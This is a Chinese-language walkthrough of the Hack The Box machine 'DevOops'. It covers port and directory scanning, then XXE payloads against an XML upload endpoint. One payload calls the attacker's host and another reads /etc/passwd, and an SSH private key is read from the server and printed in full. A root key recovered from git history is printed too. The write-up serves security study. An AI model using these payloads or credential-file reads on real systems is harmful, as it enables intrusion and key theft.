# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责

# 探测

开放端口
```
┌──(root㉿ss)-[~]
└─# nmap -p- --open --min-rate=1000 10.10.10.91 -Pn   
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-01 02:44 EDT
Nmap scan report for 10.10.10.91
Host is up (0.0043s latency).
Not shown: 64245 closed tcp ports (reset), 1288 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 16.42 seconds
```


详细端口信息
```
┌──(root㉿ss)-[~]
└─# nmap -sV -Pn -A -O 10.10.10.91 -p 22,5000       
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-01 02:52 EDT
Nmap scan report for 10.10.10.91
Host is up (0.0037s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 42:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 (RSA)
|   256 b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 (ECDSA)
|_  256 d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 (ED25519)
5000/tcp open  http    Gunicorn 19.7.1
|_http-server-header: gunicorn/19.7.1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.16 (95%), Linux 3.18 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.10 - 4.11 (93%), Oracle VM Server 3.4.2 (Linux 4.1) (93%), Linux 3.12 (93%), Linux 3.13 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5000/tcp)
HOP RTT     ADDRESS
1   4.52 ms 10.10.14.1
2   4.83 ms 10.10.10.91

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.81 seconds

```

# web

5000端口跑了一个web服务，web server是Gunicorn，版本号：19.7.1

经过简单搜索可知Gunicorn是一个运行python程序的web容器

目录爆破
```
┌──(root㉿ss)-[~/htb]
└─# python3 /root/dirsearch/dirsearch.py -e* -u http://10.10.10.91:5000 -t 100                                                                 

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492

Output File: /root/dirsearch/reports/10.10.10.91-5000/_22-06-01_03-02-58.txt

Error Log: /root/dirsearch/logs/errors-22-06-01_03-02-58.log

Target: http://10.10.10.91:5000/

[03:02:58] Starting: 
[03:04:00] 200 -  533KB - /feed                                             
[03:04:04] 200 -  347B  - /upload   
```

feed和upload不是文件夹，而是python里的接口，实际可能对应feed.py或者upload.py，只是web server的路由规则省略了后缀名



首页文字
```
Under construction!

This is feed.py, which will become the MVP for Blogfeeder application.

TODO: replace this with the proper feed from the dev.solita.fi backend.
```

```https://dev.solita.fi/```是一个真实存在的网站


upload有一个上传功能，文字内容
```
This is a test API! The final API will not have this functionality.
Upload a new file

XML elements: Author, Subject, Content
```

上传的xml需要包括Author, Subject, Content三个字段

我们构建下面一个xml
```
<?xml version="1.0" encoding="UTF-8"?>
<data>
<Author>max</Author>
<Subject>test</Subject>
<Content>hello</Content>
</data>
```

后台上传以后用burp截断查看返回数据

返回：
```
HTTP/1.1 200 OK

Server: gunicorn/19.7.1

Date: Wed, 01 Jun 2022 08:38:25 GMT

Connection: close

Content-Type: text/html; charset=utf-8

Content-Length: 150



 PROCESSED BLOGPOST: 

  Author: max

 Subject: test

 Content: hello

 URL for later reference: /uploads/test.xml

 File path: /home/roosa/deploy/src
```

返回了上传路径，我们在url可以访问到上传的xml文件


# xxe攻击

下面payload虽然报错了
```
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [

	<!ENTITY  % xxe SYSTEM "http://10.10.16.4/xxe" >

	%xxe;

]>

<data>

<Author></Author>

<Subject>test</Subject>

<Content>hello</Content>

</data>
```

但是其实可以访问到我们本地的web server，证明存在xxe

```
┌──(root💀kali)-[~/htb/DevOops]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.91 - - [01/Jun/2022 05:07:23] code 404, message File not found
10.10.10.91 - - [01/Jun/2022 05:07:23] "GET /xxe HTTP/1.0" 404 -

```


下面payload读取```/etc/passwd```，并且注入回显到Author字段
```
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [

	<!ENTITY xxe SYSTEM "file:///etc/passwd" >

]>

<data>

<Author>&xxe;</Author>

<Subject>test</Subject>

<Content>hello</Content>

</data>
```

burp返回
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
osboxes:x:1000:1000:osboxes.org,,,:/home/osboxes:/bin/false
git:x:1001:1001:git,,,:/home/git:/bin/bash
roosa:x:1002:1002:,,,:/home/roosa:/bin/bash
sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
blogfeed:x:1003:1003:,,,:/home/blogfeed:/bin/false
```

三个有home目录的用户
root,git,roosa


拿到roosa的ssh证书
```
<!ENTITY xxe SYSTEM "file:///home/roosa/.ssh/id_rsa" >
```

返回：
```
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuMMt4qh/ib86xJBLmzePl6/5ZRNJkUj/Xuv1+d6nccTffb/7
9sIXha2h4a4fp18F53jdx3PqEO7HAXlszAlBvGdg63i+LxWmu8p5BrTmEPl+cQ4J
R/R+exNggHuqsp8rrcHq96lbXtORy8SOliUjfspPsWfY7JbktKyaQK0JunR25jVk
v5YhGVeyaTNmSNPTlpZCVGVAp1RotWdc/0ex7qznq45wLb2tZFGE0xmYTeXgoaX4
9QIQQnoi6DP3+7ErQSd6QGTq5mCvszpnTUsmwFj5JRdhjGszt0zBGllsVn99O90K
m3pN8SN1yWCTal6FLUiuxXg99YSV0tEl0rfSUwIDAQABAoIBAB6rj69jZyB3lQrS
JSrT80sr1At6QykR5ApewwtCcatKEgtu1iWlHIB9TTUIUYrYFEPTZYVZcY50BKbz
ACNyme3rf0Q3W+K3BmF//80kNFi3Ac1EljfSlzhZBBjv7msOTxLd8OJBw8AfAMHB
lCXKbnT6onYBlhnYBokTadu4nbfMm0ddJo5y32NaskFTAdAG882WkK5V5iszsE/3
koarlmzP1M0KPyaVrID3vgAvuJo3P6ynOoXlmn/oncZZdtwmhEjC23XALItW+lh7
e7ZKcMoH4J2W8OsbRXVF9YLSZz/AgHFI5XWp7V0Fyh2hp7UMe4dY0e1WKQn0wRKe
8oa9wQkCgYEA2tpna+vm3yIwu4ee12x2GhU7lsw58dcXXfn3pGLW7vQr5XcSVoqJ
Lk6u5T6VpcQTBCuM9+voiWDX0FUWE97obj8TYwL2vu2wk3ZJn00U83YQ4p9+tno6
NipeFs5ggIBQDU1k1nrBY10TpuyDgZL+2vxpfz1SdaHgHFgZDWjaEtUCgYEA2B93
hNNeXCaXAeS6NJHAxeTKOhapqRoJbNHjZAhsmCRENk6UhXyYCGxX40g7i7T15vt0
ESzdXu+uAG0/s3VNEdU5VggLu3RzpD1ePt03eBvimsgnciWlw6xuZlG3UEQJW8sk
A3+XsGjUpXv9TMt8XBf3muESRBmeVQUnp7RiVIcCgYBo9BZm7hGg7l+af1aQjuYw
agBSuAwNy43cNpUpU3Ep1RT8DVdRA0z4VSmQrKvNfDN2a4BGIO86eqPkt/lHfD3R
KRSeBfzY4VotzatO5wNmIjfExqJY1lL2SOkoXL5wwZgiWPxD00jM4wUapxAF4r2v
vR7Gs1zJJuE4FpOlF6SFJQKBgHbHBHa5e9iFVOSzgiq2GA4qqYG3RtMq/hcSWzh0
8MnE1MBL+5BJY3ztnnfJEQC9GZAyjh2KXLd6XlTZtfK4+vxcBUDk9x206IFRQOSn
y351RNrwOc2gJzQdJieRrX+thL8wK8DIdON9GbFBLXrxMo2ilnBGVjWbJstvI9Yl
aw0tAoGAGkndihmC5PayKdR1PYhdlVIsfEaDIgemK3/XxvnaUUcuWi2RhX3AlowG
xgQt1LOdApYoosALYta1JPen+65V02Fy5NgtoijLzvmNSz+rpRHGK6E8u3ihmmaq
82W3d4vCUPkKnrgG8F7s3GL6cqWcbZBd0j9u88fUWfPxfRaQU3s=
-----END RSA PRIVATE KEY-----
```


拿到foothold和user.txt

```
┌──(root💀kali)-[~/htb/DevOops]
└─# ssh -i id_rsa roosa@10.10.10.91                             
The authenticity of host '10.10.10.91 (10.10.10.91)' can't be established.
RSA key fingerprint is SHA256:G2IZC851DvV/6n2//JapxYw9G6jPstURBoZbmxIk954.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.91' (RSA) to the list of known hosts.
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

135 packages can be updated.
60 updates are security updates.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

roosa@gitter:~$ whoami
roosa
roosa@gitter:~$ ls
deploy   Documents  examples.desktop  Pictures  run-blogfeed.sh  service.sh~  user.txt  work
Desktop  Downloads  Music             Public    service.sh       Templates    Videos
roosa@gitter:~$ cat user.txt
c5808e16....

```


# 提权
查看roosa的命令行记录


创建了ssh证书
```
roosa@gitter:~$ cat .bash_history
ssh-keygen --help
ssh-keygen 
ls -altr .ssh/
cat .ssh/id_rsa.pub 
nano /etc/host
nano /etc/hostname 
sudo nano /etc/hostname 
exit
nano .ssh/id_rsa.pub 
exit
ssh git@localhost
exit
ssh git@localhost
clear
apt-get upgrade
exit

```

创建了一个git项目的版本
```
mkdir work
cd work
mkdir blogfeed
git init
git add .
git commit -m 'initial commit'
git config --global user.email "roosa@solita.fi"
git config --global user.name "Roosa Hakkerson"
git commit -m 'initial commit'
nano README-MD
nano README-md
nano README.md
git add README.md 
git commit -m 'initial commit'
git remote add origin git@localhost:/srv/git/blogfeed.git
git push origin master
exit

```

创建了一个auth_credentials.key，并做了代码提交，注释：add key for feed integration from tnerprise backend
```
mkdir src
mkdir resources
cd resources
mkdir integration
mkdir integration/auth_credentials.key
nano integration/auth_credentials.key/
ls -altr
chmod go-rwx authcredentials.key 
ls -atlr
cd ..
ls -altr
chmod -R o-rwx .
ls -altr
ls resources/
ls resources/integration/
ls -altr resources/
ls -altr resources/integration/
rm -Rf resources/integration/auth_credentials.key
mv resources/authcredentials.key resources/integration/
git add resources/integration/authcredentials.key 
git commit -m 'add key for feed integration from tnerprise backend'
ls -altr resources/integration/
git push

```

删除了原来的auth_credentials.key，修改auth_credentials.key，并添加注释：add key for feed integration from tnerprise backend
```
ls -altr
ls resources/
ls resources/integration/
ls -altr resources/
ls -altr resources/integration/
rm -Rf resources/integration/auth_credentials.key
mv resources/authcredentials.key resources/integration/
git add resources/integration/authcredentials.key 
git commit -m 'add key for feed integration from tnerprise backend'
ls -altr resources/integration/
git push

```


再次生成了一个ssh秘钥，并且替换到authcredentials.key，注释：reverted accidental commit with proper key
```
ssh-keygen
ös -altr
ls .altr
ls -altr
cat kak
cp kak resources/integration/authcredentials.key 
git add resources/integration/authcredentials.key 
git commit -m 'reverted accidental commit with proper key'
git push
ls -altr
rm kak
rm kak.pub 

```

我们来到项目，查看git 日志
```
roosa@gitter:~/work/blogfeed$ git log
commit 7ff507d029021b0915235ff91e6a74ba33009c6d
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Mon Mar 26 06:13:55 2018 -0400

    Use Base64 for pickle feed loading

commit 26ae6c8668995b2f09bf9e2809c36b156207bfa8
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Tue Mar 20 15:37:00 2018 -0400

    Set PIN to make debugging faster as it will no longer change every time the application code is changed. Remember to remove before production use.

commit cec54d8cb6117fd7f164db142f0348a74d3e9a70
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Tue Mar 20 15:08:09 2018 -0400

    Debug support added to make development more agile.

commit ca3e768f2434511e75bd5137593895bd38e1b1c2
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Tue Mar 20 08:38:21 2018 -0400

    Blogfeed app, initial version.

commit dfebfdfd9146c98432d19e3f7d83cc5f3adbfe94
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Tue Mar 20 08:37:56 2018 -0400

    Gunicorn startup script

commit 33e87c312c08735a02fa9c796021a4a3023129ad
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Mon Mar 19 09:33:06 2018 -0400

    reverted accidental commit with proper key

commit d387abf63e05c9628a59195cec9311751bdb283f
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Mon Mar 19 09:32:03 2018 -0400

    add key for feed integration from tnerprise backend

commit 1422e5a04d1b52a44e6dc81023420347e257ee5f
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Mon Mar 19 09:24:30 2018 -0400

    Initial commit
:

```


结合bash历史命令以及git的提交日志，我们猜测当第一次提交authcredentials.key的时候，开发者给予了一个高权限登录账号的key
随后又修改了这个authcredentials.key的登录信息，换成了另外一个权限更小的账号

那么我们可以利用git的代码回退，拿到一开始那个高权限用户的秘钥

回退到第一次添加秘钥的代码
```
roosa@gitter:~/work/blogfeed$ git reset --hard d387abf63e05c9628a59195cec9311751bdb283f
HEAD is now at d387abf add key for feed integration from tnerprise backend
roosa@gitter:~/work/blogfeed$ 

```

查看秘钥
```
roosa@gitter:~/work/blogfeed/resources/integration$ cat authcredentials.key 
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde
8PDgpt/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i
vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH/NwYW2iovTRK
nz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt/rEgIVmrb+
CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc/SHSE0c
F9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oH
uzjPbIdyEkDc3PAYP+E/jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AAL
gCfN5I+xZGH19V4HPMCrK6PzskYII3/i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeD
k2X0256DbRv/ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSy
NnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNM
HSRik2J/7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa
2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK/oLc0RB
GLEKU6HtUuKFvlXdJ22S4/rQb0RiDcU/wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHG
jwrjv/loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41
IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO+R3+MqL7lvAhHjWKMw
+XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp/QYtjn/ltojR16JNTKqiW
7vSqlsZnT9jR2syvuhhVz4Ei9yA/VYZG2uiCpK0CgYA/UOhz+LYu/MsGoh0+yNXj
Gx+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvS
iD6fE+5/i/rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo/PcFlfXQhrERxRXJQKPHdJP7
VRFHfKaKuof+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp/INRX
S8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV+5SwWkec6
md/EqUtm84/VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ie
LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz
oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE=
-----END RSA PRIVATE KEY-----

```


保存到本地，使用秘钥登录。成功提权到root
```
┌──(root💀kali)-[~/htb/DevOops]
└─# vim id_rsa2
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/htb/DevOops]
└─# chmod 600 id_rsa2 
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/htb/DevOops]
└─# ssh -i id_rsa2 root@10.10.10.91                             
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

135 packages can be updated.
60 updates are security updates.

Last login: Mon Mar 26 06:23:48 2018 from 192.168.57.1
root@gitter:~# whoami
root
root@gitter:~# cd /root
root@gitter:~# ls
root.txt
root@gitter:~# cat root.txt
d4fe1e7f71874.....
root@gitter:~# 

```